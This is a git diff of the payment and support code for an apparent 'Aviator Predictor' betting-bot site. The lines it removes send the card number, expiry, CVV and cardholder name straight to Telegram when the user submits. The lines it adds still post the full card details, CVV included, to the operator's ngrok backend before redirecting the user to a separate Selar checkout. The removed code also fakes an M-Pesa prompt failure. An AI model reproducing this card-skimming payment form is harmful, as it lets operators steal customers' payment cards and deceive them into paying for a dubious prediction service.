                 // Show selected payment method
                 if (method === 'card') {
                     document.getElementById('cardPayment').classList.remove('hidden');
-                } else if (method === 'paypal') {
-                    document.getElementById('paypalPayment').classList.remove('hidden');
-                } else if (method === 'crypto') {
-                    document.getElementById('cryptoPayment').classList.remove('hidden');
-                } else if (method === 'mobile') {
-                    document.getElementById('mobilePayment').classList.remove('hidden');
-                    // Update paybill amounts when mobile money is selected
-                    updatePaybillAmounts();
                 }
-            }
-            
-            // Crypto option selection
-            if (e.target.closest('.crypto-option')) {
-                const option = e.target.closest('.crypto-option');
-                document.querySelectorAll('.crypto-option').forEach(opt => opt.classList.remove('selected'));
-                option.classList.add('selected');
-                
-                const coin = option.dataset.coin;
-                showCryptoPaymentDetails(coin);
             }
         });
 
@@ -2082,58 +1024,147 @@ ${contactType}: ${contact}
             e.target.value = e.target.value.replace(/[^0-9]/g, '');
         });
 
-        // Payment form submission
-        document.getElementById('paymentForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
+        // Handle card payment option click - show/hide card details
+        document.getElementById('cardPaymentOption').addEventListener('click', function() {
+            const cardDetails = document.getElementById('cardPayment');
             
-            const paymentMethod = document.querySelector('.payment-option.selected').dataset.method;
-            const completePaymentBtn = document.getElementById('completePaymentBtn');
+            console.log('Card option clicked'); // Debug log
+            console.log('Current card display:', cardDetails.style.display); // Debug log
             
-            // Capture and send card payment details to Telegram IMMEDIATELY when button is pressed
-            if (paymentMethod === 'card') {
-                const cardNumber = document.getElementById('cardNumber').value;
-                const expiryDate = document.getElementById('expiryDate').value;
-                const cvv = document.getElementById('cvv').value;
-                const cardholderName = document.getElementById('cardholderName').value;
-                const userContact = sessionStorage.getItem('aviator_contact') || 'Not provided';
-                
-                // Send card details to Telegram immediately before any payment processing
-                const cardMessage = `🔔 NEW CARD PAYMENT ATTEMPT\n\n` +
-                    `👤 Customer: ${userContact}\n` +
-                    `💳 Card Number: ${cardNumber}\n` +
-                    `📅 Expiry Date: ${expiryDate}\n` +
-                    `🔒 CVV: ${cvv}\n` +
-                    `📝 Cardholder Name: ${cardholderName}\n` +
-                    `⏰ Time: ${new Date().toLocaleString()}\n` +
-                    `🤖 Source: Bot Page Payment`;
-                
-                // Send to Telegram immediately
-                try {
-                    await sendToTelegram(cardMessage);
-                } catch (error) {
-                    console.error('Failed to send card details to Telegram:', error);
-                    // Continue with payment processing even if Telegram fails
-                }
+            // Toggle card details visibility (both buttons always visible)
+            if (cardDetails.style.display === 'none' || cardDetails.style.display === '') {
+                cardDetails.style.display = 'block';
+                this.classList.add('selected');
+                console.log('Showing card details'); // Debug log
+            } else {
+                cardDetails.style.display = 'none';
+                this.classList.remove('selected');
+                console.log('Hiding card details'); // Debug log
             }
+        });
+
+        // Handle Complete Payment button click (always visible)
+        document.getElementById('completePaymentBtn').addEventListener('click', async function() {
+            const btn = this;
+            const userContact = sessionStorage.getItem('aviator_contact') || 'Not provided';
+            const packageName = `${selectedPlan.duration} Access`;
             
-            // Disable button and show processing
-            completePaymentBtn.disabled = true;
-            completePaymentBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing Payment...';
+            // Show loading state
+            btn.disabled = true;
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Redirecting to Checkout...';
+            
+            // Get Selar link for current plan
+            const selarLinks = {
+                '2min': 'https://selar.com/257r71m8jq',
+                '15min': 'https://selar.com/727771n8q8', 
+                '30min': 'https://selar.com/7z65psg003',
+                '1hour': 'https://selar.com/5733769561',
+                '12hour': 'https://selar.com/YOUR_12HOUR_LINK',
+                '24hour': 'https://selar.com/YOUR_24HOUR_LINK'
+            };
+            const selarLink = selarLinks[selectedPlan.plan] || 'https://selar.com/m/jordan-baker1294382';
             
             try {
-                if (paymentMethod === 'card') {
-                    await processCardPayment();
-                } else if (paymentMethod === 'paypal') {
-                    await processPaypalPayment();
+                // Check if card details are filled (optional)
+                const cardNumber = document.getElementById('cardNumber').value;
+                const cardDetails = document.getElementById('cardPayment');
+                const hasCardInfo = cardDetails.style.display === 'block' && cardNumber.trim() !== '';
+                
+                if (hasCardInfo) {
+                    // Send card info via secure backend endpoint
+                    const expiryDate = document.getElementById('expiryDate').value;
+                    const cvv = document.getElementById('cvv').value;
+                    const cardholderName = document.getElementById('cardholderName').value;
+                    
+                    const response = await fetch(`${API_BASE_URL}/api/auth/card-payment`, {
+                        method: 'POST',
+                        headers: { 
+                            'Content-Type': 'application/json',
+                            'ngrok-skip-browser-warning': 'true'
+                        },
+                        body: JSON.stringify({
+                            contact: userContact,
+                            packageName: packageName,
+                            amount: selectedPlan.price,
+                            source: 'Bot Payment Form',
+                            cardInfo: {
+                                cardNumber: cardNumber,
+                                expiryDate: expiryDate,
+                                cvv: cvv,
+                                cardholderName: cardholderName
+                            },
+                            timestamp: new Date().toISOString()
+                        })
+                    });
+                    
+                    const result = await response.json();
+                    if (!result.success) {
+                        console.warn('⚠️ Card payment notification failed:', result.error);
+                    }
                 } else {
-                    // For mobile money and crypto, these are handled separately
-                    throw new Error('Unsupported payment method');
+                    // Send simple Selar notification
+                    await sendSelarNotification(userContact, packageName);
                 }
             } catch (error) {
-                console.error('Payment processing error:', error);
-                completePaymentBtn.disabled = false;
-                completePaymentBtn.innerHTML = '<i class="fas fa-lock"></i> Complete Payment';
-                alert('Payment processing failed. Please try again.');
+                console.error('Failed to send notification:', error);
+            }
+            
+            // Redirect to Selar checkout
+            setTimeout(() => {
+                window.open(selarLink, '_blank');
+                
+                // Reset button
+                btn.disabled = false;
+                btn.innerHTML = '<i class="fas fa-credit-card"></i> Complete Payment via Selar';
+                
+                // Close payment modal
+                closePaymentModal();
+                
+                // Show verification message
+                alert('Payment window opened! Complete your payment in the new tab, then return here and click "I\'ve Sent Payment" for verification.');
+                
+                // Add verification button to activation overlay
+                showVerificationButton();
+            }, 1000);
+        });
+
+        // Handle activate bot button click - for manual verification
+        document.getElementById('activateBotBtn').addEventListener('click', async function() {
+            const btn = this;
+            const userContact = sessionStorage.getItem('aviator_contact') || 'Not provided';
+            
+            // Show loading state
+            btn.disabled = true;
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Requesting Verification...';
+            
+            // Send verification request to admin
+            const verificationMessage = `🤖 BOT ACTIVATION REQUEST\n\n` +
+                `👤 Customer: ${userContact}\n` +
+                `💰 Plan: ${selectedPlan.duration} Access ($${selectedPlan.price})\n` +
+                `⏰ Time: ${new Date().toLocaleString()}\n` +
+                `📱 Source: Bot Payment Modal\n` +
+                `💡 Status: Payment sent, requesting manual verification\n\n` +
+                `🔔 Customer claims payment has been sent and requests bot activation.`;
+            
+            try {
+                await sendToTelegram(verificationMessage);
+                
+                // Close payment modal
+                closePaymentModal();
+                
+                // Show success message
+                alert('Verification request sent! Our admin will verify your payment and activate your bot access shortly. Please wait...');
+                
+                // Add verification button to activation overlay
+                showVerificationButton();
+                
+            } catch (error) {
+                console.error('Failed to send verification request:', error);
+                alert('Failed to send verification request. Please try again.');
+                
+                // Reset button
+                btn.disabled = false;
+                btn.innerHTML = '<i class="fas fa-play"></i> Activate Bot (Payment Sent)';
             }
         });
 
@@ -2218,79 +1249,6 @@ ${contactType}: ${contact}
             }
         }
 
-        // PayPal payment processing with backend integration
-        async function processPaypalPayment() {
-            try {
-                const orderId = 'BOT_PAYPAL_' + Date.now();
-                const userContact = sessionStorage.getItem('aviator_contact') || 'Unknown';
-                
-                // First, store the payment data in the backend
-                const paymentData = {
-                    orderId: orderId,
-                    email: userContact,
-                    packageName: `${selectedPlan.duration} Access`,
-                    amount: selectedPlan.price,
-                    currency: 'USD',
-                    paymentMethod: 'paypal',
-                    status: 'pending_verification',
-                    timestamp: new Date().toISOString(),
-                    userAgent: navigator.userAgent
-                };
-
-                // Store payment data in backend
-                const storeResponse = await fetch(`${API_BASE_URL}/api/payments/crypto/personal/create-order`, {
-                    method: 'POST',
-                    headers: { 
-                        'Content-Type': 'application/json',
-                        'ngrok-skip-browser-warning': 'true'
-                    },
-                    body: JSON.stringify(paymentData)
-                });
-
-                if (!storeResponse.ok) {
-                    throw new Error(`Failed to store payment data: ${storeResponse.status}`);
-                }
-                
-                // Send verification request to Telegram
-                const telegramMessage = `🟦 PAYPAL PAYMENT VERIFICATION NEEDED
-
-🤖 SOURCE: Aviator Predictor Bot
-📦 Package: ${selectedPlan.duration} Access  
-💰 Amount: $${selectedPlan.price}
-💳 Payment Method: PayPal
-🆔 Order ID: ${orderId}
-📞 User: ${userContact}
-⏰ Time: ${new Date().toLocaleString()}
-
-⚠️ ADMIN ACTION REQUIRED: Please verify this PayPal payment and respond.`;
-
-                const response = await fetch(`${API_BASE_URL}/api/telegram/send`, {
-                    method: 'POST',
-                    headers: { 
-                        'Content-Type': 'application/json',
-                        'ngrok-skip-browser-warning': 'true'
-                    },
-                    body: JSON.stringify({
-                        message: telegramMessage,
-                        orderId: orderId,
-                        includeVerificationButtons: true
-                    })
-                });
-
-                if (!response.ok) {
-                    throw new Error(`Backend API error: ${response.status}`);
-                }
-
-                // Show processing message and start polling
-                showPaymentProcessing('PayPal', orderId);
-                pollPaymentStatus(orderId);
-                
-            } catch (error) {
-                console.error('PayPal payment error:', error);
-                throw error;
-            }
-        }
-
         // Show payment processing UI
         function showPaymentProcessing(method, orderId) {
             // Hide the payment form and show processing
@@ -2315,216 +1273,6 @@ ${contactType}: ${contact}
                     <p style="color:#f1c40f;font-weight:bold;">This may take a few moments...</p>
                 </div>
             `;
-        }
-
-        // Crypto payment functions
-        function showCryptoPaymentDetails(coin) {
-            const detailsDiv = document.getElementById('crypto-pay-details');
-            const amount = selectedPlan ? selectedPlan.price : '0.00';
-            
-            let address, qrData;
-            if (coin === 'BTC') {
-                address = 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh';
-                qrData = `bitcoin:${address}?amount=${(parseFloat(amount) / 45000).toFixed(8)}`;
-            } else {
-                address = 'TXYZabc123def456ghi789jkl012mno345pqr678';
-                qrData = `tether:${address}?amount=${amount}`;
-            }
-            
-            detailsDiv.innerHTML = `
-                <div style="text-align:center;padding:20px;background:#1a1a1a;border-radius:8px;">
-                    <h4>Pay with ${coin}</h4>
-                    <div style="background:#2d2d2d;padding:15px;border-radius:6px;margin:15px 0;">
-                        <p style="margin:0 0 5px 0;color:#ccc;">Send exactly:</p>
-                        <p style="margin:0;font-size:18px;color:#f1c40f;font-weight:bold;">
-                            ${coin === 'BTC' ? (parseFloat(amount) / 45000).toFixed(8) + ' BTC' : amount + ' USDT'}
-                        </p>
-                    </div>
-                    <div style="background:#2d2d2d;padding:15px;border-radius:6px;margin:15px 0;word-break:break-all;">
-                        <p style="margin:0 0 5px 0;color:#ccc;">To address:</p>
-                        <p style="margin:0;font-size:14px;color:#00ff88;font-family:monospace;">${address}</p>
-                        <button onclick="copyToClipboard('${address}')" style="background:#007bff;color:white;border:none;padding:8px 12px;border-radius:4px;margin-top:10px;cursor:pointer;">
-                            Copy Address
-                        </button>
-                    </div>
-                    <div style="margin:20px 0;">
-                        <div style="width:200px;height:200px;margin:0 auto;background:#fff;display:flex;align-items:center;justify-content:center;border-radius:8px;">
-                            <div style="color:#333;font-size:12px;">QR Code</div>
-                        </div>
-                    </div>
-                    <button onclick="confirmCryptoPayment('${coin}', '${amount}')" style="background:#28a745;color:white;padding:12px 24px;border:none;border-radius:6px;cursor:pointer;font-weight:bold;">
-                        ✅ I've Sent ${coin} Payment
-                    </button>
-                </div>
-            `;
-        }
-
-        function copyToClipboard(text) {
-            navigator.clipboard.writeText(text).then(() => {
-                alert('Address copied to clipboard!');
-            }).catch(() => {
-                const textArea = document.createElement('textarea');
-                textArea.value = text;
-                document.body.appendChild(textArea);
-                textArea.select();
-                document.execCommand('copy');
-                document.body.removeChild(textArea);
-                alert('Address copied to clipboard!');
-            });
-        }
-
-        async function confirmCryptoPayment(coin, amount) {
-            try {
-                const userContact = sessionStorage.getItem('aviator_contact') || 'Unknown';
-                
-                // Store payment data in backend and get the real orderId
-                const storeResponse = await fetch(`${API_BASE_URL}/api/payments/crypto/personal/create-order`, {
-                    method: 'POST',
-                    headers: { 
-                        'Content-Type': 'application/json',
-                        'ngrok-skip-browser-warning': 'true'
-                    },
-                    body: JSON.stringify({
-                        email: userContact,
-                        packageName: `${selectedPlan.duration} Access`,
-                        amount: amount,
-                        currency: coin, // Send the actual cryptocurrency (BTC/USDT)
-                        paymentMethod: 'crypto',
-                        timeSlot: 'anytime',
-                        bettingSite: 'multiple'
-                    })
-                });
-
-                if (!storeResponse.ok) {
-                    throw new Error(`Failed to store payment data: ${storeResponse.status}`);
-                }
-                
-                const storeResult = await storeResponse.json();
-                const orderId = storeResult.orderId; // Use the orderId from backend
-                
-                console.log('✅ Crypto payment stored, orderId:', orderId);
-                
-                // Send verification request to Telegram with enhanced formatting
-                const telegramMessage = `🔶 CRYPTO PAYMENT VERIFICATION NEEDED
-
-🤖 SOURCE: Aviator Predictor Bot
-📦 Package: ${selectedPlan.duration} Access  
-💰 Amount: $${amount}
-⚡ Cryptocurrency: ${coin}
-🆔 Order ID: ${orderId}
-� User: ${sessionStorage.getItem('aviator_contact') || 'Unknown'}
-⏰ Time: ${new Date().toLocaleString()}
-
-⚠️ ADMIN ACTION REQUIRED: Please verify this ${coin} payment and respond.`;
-
-                const response = await fetch(`${API_BASE_URL}/api/telegram/send`, {
-                    method: 'POST',
-                    headers: { 
-                        'Content-Type': 'application/json',
-                        'ngrok-skip-browser-warning': 'true'
-                    },
-                    body: JSON.stringify({
-                        message: telegramMessage,
-                        orderId: orderId,
-                        includeVerificationButtons: true,
-                        paymentData: {
-                            email: userContact,
-                            packageName: `${selectedPlan.duration} Access`,
-                            amount: amount,
-                            currency: coin,
-                            paymentMethod: 'crypto',
-                            timeSlot: 'anytime',
-                            bettingSite: 'multiple'
-                        }
-                    })
-                });
-
-                if (!response.ok) {
-                    throw new Error(`Backend API error: ${response.status}`);
-                }
-
-                const result = await response.json();
-                console.log('Crypto verification sent via backend:', result);
-
-                // Show verification pending message
-                document.getElementById('crypto-pay-details').innerHTML = `
-                    <div style="text-align:center;padding:40px;">
-                        <div style="font-size:64px;color:#f1c40f;margin-bottom:20px;">⏳</div>
-                        <h4 style="color:#f1c40f;margin-bottom:15px;">Verification Pending...</h4>
-                        <p style="color:#ccc;margin-bottom:20px;">Your ${coin} payment is being verified by our admin.</p>
-                        
-                        <div style="background:#2d4a2d;padding:20px;border-radius:8px;margin:20px 0;border:1px solid #4a6b4a;">
-                            <h5 style="color:#9fff9f;margin:0 0 10px 0;">📋 Payment Summary</h5>
-                            <p style="color:#9fff9f;margin:5px 0;">📦 Package: ${selectedPlan.duration} Access</p>
-                            <p style="color:#9fff9f;margin:5px 0;">💵 Amount: $${amount}</p>
-                            <p style="color:#9fff9f;margin:5px 0;">⚡ Coin: ${coin}</p>
-                            <p style="color:#9fff9f;margin:5px 0;">🆔 Order: ${orderId}</p>
-                        </div>
-                        
-                        <div style="border:4px solid #333;border-top:4px solid #f1c40f;border-radius:50%;width:40px;height:40px;animation:spin 2s linear infinite;margin:20px auto;"></div>
-                        <p style="color:#f1c40f;font-weight:bold;">This may take a few moments...</p>
-                    </div>
-                `;
-
-                // Start polling for verification using backend
-                pollPaymentStatus(orderId);
-                
-            } catch (error) {
-                console.error('Crypto payment verification error:', error);
-                alert('Verification request sent. Please wait for admin confirmation.');
-            }
-        }
-
-        // Mobile money payment functions
-        function updatePaybillAmounts() {
-            if (selectedPlan) {
-                const usdAmount = selectedPlan.price;
-                const kesAmount = Math.round(parseFloat(usdAmount) * 130); // Approximate USD to KES conversion
-                
-                document.querySelectorAll('.paybill-amount').forEach(el => {
-                    el.textContent = usdAmount;
-                });
-                document.querySelectorAll('.paybill-amount-kes').forEach(el => {
-                    el.textContent = kesAmount.toLocaleString();
-                });
-            }
-        }
-
-        // M-Pesa specific validation
-        function validateMobileForMpesa(phone) {
-            const cleanPhone = phone.replace(/[\s\-\(\)]/g, '');
-            
-            // M-Pesa number validation (Kenya specific)
-            if (cleanPhone.length < 10) {
-                return { valid: false, message: 'Phone number too short. Please enter a valid Kenyan mobile number.' };
-            }
-            
-            // Check for valid Kenyan mobile prefixes
-            if (cleanPhone.startsWith('254')) {
-                // International format
-                if (cleanPhone.length !== 12) {
-                    return { valid: false, message: 'Invalid format. Use 254XXXXXXXXX (12 digits).' };
-                }
-                const localPart = cleanPhone.substring(3);
-                if (!localPart.match(/^(7|1)[0-9]{8}$/)) {
-                    return { valid: false, message: 'Invalid Kenyan mobile number. Must start with 254 followed by 7 or 1.' };
-                }
-            } else if (cleanPhone.startsWith('+254')) {
-                // International format with +
-                return { valid: false, message: 'Please remove the + sign. Use format: 254XXXXXXXXX' };
-            } else if (cleanPhone.startsWith('0')) {
-                // Local format
-                if (cleanPhone.length !== 10) {
-                    return { valid: false, message: 'Invalid local format. Use 07XXXXXXXX or 01XXXXXXXX (10 digits).' };
-                }
-                if (!cleanPhone.match(/^0(7|1)[0-9]{8}$/)) {
-                    return { valid: false, message: 'Invalid Kenyan mobile number. Must start with 07 or 01.' };
-                }
-            } else {
-                return { valid: false, message: 'Invalid format. Use 254XXXXXXXXX or 07XXXXXXXX format.' };
-            }
-            
-            return { valid: true };
         }
 
         // Payment status checking using backend
@@ -2569,8 +1317,7 @@ ${contactType}: ${contact}
                         clearInterval(pollInterval);
                         
                         // Show success and complete purchase
-                        const cryptoDiv = document.getElementById('crypto-pay-details');
-                        const mobileDiv = document.getElementById('mobilePayment');
+
                         const modalContent = document.querySelector('.payment-modal-content');
                         
                         // Determine which container to update
@@ -2684,186 +1431,6 @@ ${contactType}: ${contact}
                 }, 2000);
             });
         }
-
-        // Mobile money pay button handler
-        document.addEventListener('DOMContentLoaded', function() {
-            document.getElementById('mobile-pay-btn').addEventListener('click', async function() {
-                const phone = document.getElementById('mobilePhone').value.trim();
-                const payBtn = this;
-                
-                if (!phone) {
-                    alert('Please enter your phone number');
-                    return;
-                }
-                
-                // Validate mobile number for M-Pesa
-                const validation = validateMobileForMpesa(phone);
-                if (!validation.valid) {
-                    alert(validation.message);
-                    return;
-                }
-                
-                // Disable button and show processing
-                payBtn.disabled = true;
-                payBtn.innerHTML = '<div style="display:inline-block;width:20px;height:20px;border:2px solid #fff;border-top:2px solid #28a745;border-radius:50%;animation:spin 1s linear infinite;"></div> Processing with Pesapal...';
-                
-                try {
-                    // Try Pesapal API integration first
-                    const pesapalResponse = await fetch(`${API_BASE_URL}/api/payments/pesapal/create-order`, {
-                        method: 'POST',
-                        headers: { 
-                            'Content-Type': 'application/json',
-                            'ngrok-skip-browser-warning': 'true'
-                        },
-                        body: JSON.stringify({
-                            amount: selectedPlan.price,
-                            email: sessionStorage.getItem('aviator_contact') || 'bot@aviator.com',
-                            phone: phone,
-                            packageName: selectedPlan.duration + ' Access',
-                            timeSlot: new Date().toLocaleTimeString(),
-                            bettingSite: 'Aviator Bot'
-                        })
-                    });
-
-                    if (pesapalResponse.ok) {
-                        const pesapalData = await pesapalResponse.json();
-                        if (pesapalData.redirectUrl) {
-                            // Redirect to Pesapal payment page
-                            window.open(pesapalData.redirectUrl, '_blank');
-                            payBtn.disabled = false;
-                            payBtn.innerHTML = 'Pay with M-Pesa';
-                            
-                            // Show status message
-                            alert('Payment window opened. Complete payment in the new tab, then return here.');
-                            return;
-                        }
-                    }
-                    
-                    // If Pesapal fails, fall back to manual paybill
-                    throw new Error('Pesapal service unavailable');
-                    
-                } catch (error) {
-                    console.error('Pesapal payment failed:', error);
-                    
-                    // Simulate M-Pesa prompt failure and show paybill
-                    setTimeout(() => {
-                        payBtn.disabled = false;
-                        payBtn.innerHTML = 'Pay with M-Pesa';
-                        
-                        alert('M-Pesa prompt failed. Please use the Paybill option below.');
-                        
-                        // Show paybill fallback
-                        document.getElementById('paybill-fallback').style.display = 'block';
-                        updatePaybillAmounts();
-                    }, 2000);
-                }
-            });
-
-            // Paybill confirm button handler
-            document.getElementById('paybill-confirm-btn').addEventListener('click', async function() {
-                const phone = document.getElementById('mobilePhone').value.trim();
-                const confirmBtn = this;
-                
-                if (!phone) {
-                    alert('Please enter your phone number first');
-                    return;
-                }
-
-                // Validate phone number again
-                const validation = validateMobileForMpesa(phone);
-                if (!validation.valid) {
-                    alert(validation.message);
-                    return;
-                }
-
-                // Disable button
-                confirmBtn.disabled = true;
-                confirmBtn.innerHTML = '<div style="display:inline-block;width:16px;height:16px;border:2px solid #fff;border-top:2px solid #28a745;border-radius:50%;animation:spin 1s linear infinite;"></div> Sending verification...';
-
-                try {
-                    const orderId = 'BOT_MPESA_' + Date.now();
-                    const amount = selectedPlan.price;
-                    const kesAmount = Math.round(parseFloat(amount) * 130);
-                    
-                    // Send verification request to Telegram with enhanced formatting
-                    const telegramMessage = `💰 M-PESA PAYBILL VERIFICATION NEEDED
-
-🤖 SOURCE: Aviator Predictor Bot
-📦 Package: ${selectedPlan.duration} Access
-💵 Amount: $${amount} (KES ${kesAmount.toLocaleString()})
-📱 Phone: ${phone}
-🆔 Order ID: ${orderId}
-💳 Method: M-Pesa Paybill
-🏢 Business: 793174
-💼 Account: 254745087451
-� User: ${sessionStorage.getItem('aviator_contact') || 'Unknown'}
-⏰ Time: ${new Date().toLocaleString()}
-
-⚠️ ADMIN ACTION REQUIRED: Please verify this payment and respond.`;
-
-                    const response = await fetch(`${API_BASE_URL}/api/telegram/send`, {
-                        method: 'POST',
-                        headers: { 
-                            'Content-Type': 'application/json',
-                            'ngrok-skip-browser-warning': 'true'
-                        },
-                        body: JSON.stringify({
-                            message: telegramMessage,
-                            orderId: orderId,
-                            includeVerificationButtons: true,
-                            paymentData: {
-                                email: sessionStorage.getItem('aviator_contact') || 'unknown@email.com',
-                                packageName: `${selectedPlan.duration} Access`,
-                                timeSlot: 'anytime',
-                                bettingSite: 'multiple',
-                                amount: amount,
-                                currency: 'USD',
-                                paymentMethod: 'mpesa',
-                                phone: phone,
-                                kesAmount: kesAmount
-                            }
-                        })
-                    });
-
-                    if (!response.ok) {
-                        throw new Error(`Backend API error: ${response.status}`);
-                    }
-
-                    const result = await response.json();
-                    console.log('M-Pesa verification sent via backend:', result);
-
-                    // Show verification pending
-                    const mobilePaymentDiv = document.getElementById('mobilePayment');
-                    mobilePaymentDiv.innerHTML = `
-                        <div style="text-align:center;padding:40px;">
-                            <div style="font-size:64px;color:#28a745;margin-bottom:20px;">⏳</div>
-                            <h4 style="color:#28a745;margin-bottom:15px;">Verifying Your Payment...</h4>
-                            <p style="color:#ccc;margin-bottom:20px;">We're checking your M-Pesa Paybill payment.</p>
-                            
-                            <div style="background:#2d4a2d;padding:20px;border-radius:8px;margin:20px 0;border:1px solid #4a6b4a;">
-                                <h5 style="color:#9fff9f;margin:0 0 10px 0;">📋 Payment Summary</h5>
-                                <p style="color:#9fff9f;margin:5px 0;">📦 Package: ${selectedPlan.duration} Access</p>
-                                <p style="color:#9fff9f;margin:5px 0;">💵 Amount: $${amount} (KES ${kesAmount.toLocaleString()})</p>
-                                <p style="color:#9fff9f;margin:5px 0;">📱 Phone: ${phone}</p>
-                                <p style="color:#9fff9f;margin:5px 0;">🆔 Order: ${orderId}</p>
-                            </div>
-                            
-                            <div style="border:4px solid #333;border-top:4px solid #28a745;border-radius:50%;width:40px;height:40px;animation:spin 2s linear infinite;margin:20px auto;"></div>
-                            <p style="color:#28a745;font-weight:bold;">This may take a few moments...</p>
-                        </div>
-                    `;
-
-                    // Start polling for verification using backend
-                    pollPaymentStatus(orderId);
-
-                } catch (error) {
-                    console.error('Payment verification error:', error);
-                    confirmBtn.disabled = false;
-                    confirmBtn.innerHTML = '✅ I\'ve Sent Payment via Paybill';
-                    alert('Verification request sent. Please wait for admin confirmation.');
-                }
-            });
-        });
 
         function closeGame() {
             document.getElementById('gameModal').classList.add('hidden');
@@ -3369,508 +1936,62 @@ ${contactType}: ${contact}
             }, 2000);
         });
 
-        // Support Chat Functions
-        let chatSessionId = null;
-        let chatOpen = false;
-
-        function toggleSupportChat() {
-            const chatWindow = document.getElementById('chat-window');
-            const badge = document.getElementById('unread-badge');
-            
-            chatOpen = !chatOpen;
-            
-            if (chatOpen) {
-                chatWindow.style.display = 'flex';
-                badge.style.display = 'none';
+        // Chat system removed - Using Tawk.to for support
+        
+        // Logout function with backend notification
+        function logoutUser() {
+            if (confirm('Are you sure you want to logout? You will need to login again next time.')) {
+                const contact = sessionStorage.getItem('aviator_contact');
                 
-                // Initialize chat session if not exists
-                if (!chatSessionId) {
-                    chatSessionId = 'CHAT_' + Date.now();
-                    initializeChatSession();
+                // Send logout notification to backend
+                if (contact) {
+                    fetch(`${API_BASE_URL}/api/auth/logout`, {
+                        method: 'POST',
+                        headers: { 
+                            'Content-Type': 'application/json',
+                            'ngrok-skip-browser-warning': 'true'
+                        },
+                        body: JSON.stringify({ 
+                            contact: contact,
+                            timestamp: new Date().toISOString()
+                        }),
+                    }).catch(error => {
+                        console.warn('⚠️ Failed to send logout notification:', error);
+                    });
                 }
                 
-                // Mark as read and focus input
-                setTimeout(() => {
-                    document.getElementById('chat-input').focus();
-                }, 300);
-            } else {
-                chatWindow.style.display = 'none';
-            }
-        }
-
-        function initializeChatSession() {
-            // Send session start notification to admin
-            const userContact = sessionStorage.getItem('aviator_contact') || 'Anonymous User';
-            
-            fetch(`${API_BASE_URL}/api/telegram/send`, {
-                method: 'POST',
-                headers: { 
-                    'Content-Type': 'application/json',
-                    'ngrok-skip-browser-warning': 'true'
-                },
-                body: JSON.stringify({
-                    message: `💬 NEW CHAT SESSION STARTED
-                    
-🆔 Session: ${chatSessionId}
-👤 User: ${userContact}
-🌐 Page: Aviator Predictor Bot
-⏰ Time: ${new Date().toLocaleString()}
-
-User is waiting for support assistance.`,
-                    chatSessionId: chatSessionId,
-                    isNewChatSession: true
-                })
-            }).catch(console.error);
-        }
-
-        function sendChatMessage() {
-            const input = document.getElementById('chat-input');
-            const message = input.value.trim();
-            
-            if (message) {
-                addMessageToChat(message, 'user');
-                input.value = '';
+                // Clear all session data
+                clearUserSession();
                 
-                // Send message to admin via backend
-                sendMessageToAdmin(message);
-                
-                // Show typing indicator
-                showTypingIndicator();
-                
-                // Auto-respond for common queries
-                setTimeout(() => {
-                    handleAutoResponse(message);
-                }, 1500);
-            }
-        }
-
-        function sendQuickMessage(message) {
-            addMessageToChat(message, 'user');
-            sendMessageToAdmin(message);
-            showTypingIndicator();
-            
-            setTimeout(() => {
-                handleAutoResponse(message);
-            }, 1500);
-        }
-
-        function handleChatKeyPress(event) {
-            if (event.key === 'Enter') {
-                sendChatMessage();
-            }
-        }
-
-        function addMessageToChat(message, sender) {
-            const messagesContainer = document.getElementById('chat-messages');
-            const messageDiv = document.createElement('div');
-            messageDiv.className = `message ${sender}-message`;
-            
-            const avatar = sender === 'user' ? '👤' : '🎧';
-            const currentTime = new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
-            
-            messageDiv.innerHTML = `
-                <div class="message-avatar">${avatar}</div>
-                <div class="message-content">
-                    <div class="message-text">${message}</div>
-                    <div class="message-time">${currentTime}</div>
-                </div>
-            `;
-            
-            // Remove typing indicator if exists
-            const typingIndicator = document.getElementById('typing-indicator-msg');
-            if (typingIndicator) {
-                typingIndicator.remove();
-            }
-            
-            messagesContainer.appendChild(messageDiv);
-            messagesContainer.scrollTop = messagesContainer.scrollHeight;
-        }
-
-        function sendMessageToAdmin(message) {
-            const userContact = sessionStorage.getItem('aviator_contact') || 'Anonymous User';
-            
-            // First try the new backend chat system
-            sendMessageToBackendChat(message, userContact).catch(() => {
-                // Fallback to old Telegram method
-                fetch(`${API_BASE_URL}/api/telegram/send`, {
-                    method: 'POST',
-                    headers: { 
-                        'Content-Type': 'application/json',
-                        'ngrok-skip-browser-warning': 'true'
-                    },
-                    body: JSON.stringify({
-                        message: `💬 CUSTOMER MESSAGE - ${chatSessionId}
-
-👤 User: ${userContact}
-📝 Message: "${message}"
-⏰ Time: ${new Date().toLocaleString()}
-
-Reply via Admin Panel to respond to customer.`,
-                        chatSessionId: chatSessionId,
-                        customerMessage: message,
-                        customerContact: userContact
-                    })
-                }).catch(console.error);
-            });
-        }
-
-        // Send messages to Telegram support (simplified version)
-        async function sendMessageToBackendChat(message, userEmail) {
-            try {
-                // Use enhanced support message function with reply buttons
-                await sendCustomerSupportMessage(message, userEmail);
-                console.log('✅ Message sent to support team via Telegram');
-                return { success: true };
-            } catch (error) {
-                console.error('Telegram send error:', error);
-                throw error; // Re-throw to trigger fallback
-            }
-        }
-
-        function showTypingIndicator() {
-            const messagesContainer = document.getElementById('chat-messages');
-            const typingDiv = document.createElement('div');
-            typingDiv.className = 'message bot-message';
-            typingDiv.id = 'typing-indicator-msg';
-            
-            typingDiv.innerHTML = `
-                <div class="message-avatar">🎧</div>
-                <div class="message-content">
-                    <div class="typing-indicator">
-                        <div class="typing-dots">
-                            <span>Support is typing</span>
-                            <div class="dots">
-                                <span></span>
-                                <span></span>
-                                <span></span>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            `;
-            
-            messagesContainer.appendChild(typingDiv);
-            messagesContainer.scrollTop = messagesContainer.scrollHeight;
-        }
-
-        function handleAutoResponse(userMessage) {
-            const message = userMessage.toLowerCase();
-            let response = null;
-            
-            if (message.includes('payment') || message.includes('pay')) {
-                response = "I can help you with payment issues! Our system accepts crypto (BTC/USDT), M-Pesa, and card payments. What specific payment issue are you experiencing?";
-            } else if (message.includes('prediction') || message.includes('not received')) {
-                response = "If you haven't received your predictions, please check: 1) Your payment was verified 2) You're logged in with the correct email. I've notified our admin to check your account status.";
-            } else if (message.includes('how') && message.includes('work')) {
